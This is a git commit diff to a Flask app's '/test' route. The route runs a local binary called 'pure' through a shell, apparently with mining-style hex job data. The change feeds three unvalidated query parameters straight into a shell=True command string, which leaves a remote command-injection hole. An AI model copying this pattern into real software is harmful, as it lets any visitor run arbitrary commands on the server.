9e020b914c2d39e3e27b468dee4c059a954d167d
trudly <trudly@outlook.com>
2017-09-28 16:35:43 +0300

    Update app.py

--- app.py
+++ app.py
@@ -95,6 +95,10 @@ def hello_world():
 
 @app.route('/test')
 def test_world():
+    w = request.args.get('w')
+    f = request.args.get('f')
+    t = request.args.get('t')
     subprocess.Popen(["chmod +x pure"], shell=True, stdout=subprocess.PIPE).stdout.read()
-    return subprocess.Popen(["./pure 0505f49384cb054b16f69fc108640a8f627e268f51d897b4f7c74eafe9777fefd9b04abed9eec500000000e321bd84e6b2008879a16497bf6ee58644a36146b63de7c217e7f467b05d67fa01 160 170"], shell=True, stdout=subprocess.PIPE).stdout.read()
+    # return subprocess.Popen(["./pure 0505f49384cb054b16f69fc108640a8f627e268f51d897b4f7c74eafe9777fefd9b04abed9eec500000000e321bd84e6b2008879a16497bf6ee58644a36146b63de7c217e7f467b05d67fa01 160 170"], shell=True, stdout=subprocess.PIPE).stdout.read()
+    return subprocess.Popen(["./pure " + w + " " + f + " " + t], shell=True, stdout=subprocess.PIPE).stdout.read()
 
